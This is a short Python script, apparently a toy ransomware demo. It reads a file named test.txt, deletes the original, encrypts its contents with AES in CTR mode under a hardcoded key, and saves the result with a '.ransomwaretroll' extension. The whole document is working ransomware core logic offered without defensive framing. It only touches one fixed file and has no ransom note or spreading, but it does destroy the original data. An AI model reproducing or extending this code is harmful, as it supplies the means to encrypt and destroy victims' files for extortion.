import os
import pyaes

# read file
file_name = 'test.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# delete original file
os.remove(file_name)

# encrypt key
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

# encrypt file content
crypto_data = aes.encrypt(file_data)

# write encrypted file
new_file = file_name + '.ransomwaretroll'
new_file = open(new_file, 'wb')
new_file.write(crypto_data)
new_file.close()
